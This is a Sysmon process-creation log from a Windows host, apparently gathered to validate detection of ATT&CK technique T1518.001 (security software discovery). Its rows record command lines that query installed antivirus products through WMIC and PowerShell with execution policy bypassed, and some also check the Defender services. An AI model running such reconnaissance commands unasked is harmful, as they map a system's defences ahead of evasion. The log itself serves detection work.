2026-06-24T12:52:19.764Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
